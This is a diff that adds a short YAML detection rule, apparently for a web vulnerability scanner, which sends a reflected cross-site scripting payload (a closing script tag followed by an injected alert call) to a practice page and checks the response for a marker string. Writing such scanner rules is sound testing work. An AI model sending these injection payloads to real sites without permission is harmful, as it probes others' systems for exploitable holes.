@@ -1,0 +1,9 @@
+name: jsoutput-xss
+type: XSS
+rules:
+  - method: GET
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101
+    path: vul/xss/xss_04.php?message='<%2Fscript><script>alert('jsoutput-xss')<%2Fscript>&submit=submit
+    expression: result.contains("jsoutput-xss")
+author: ty
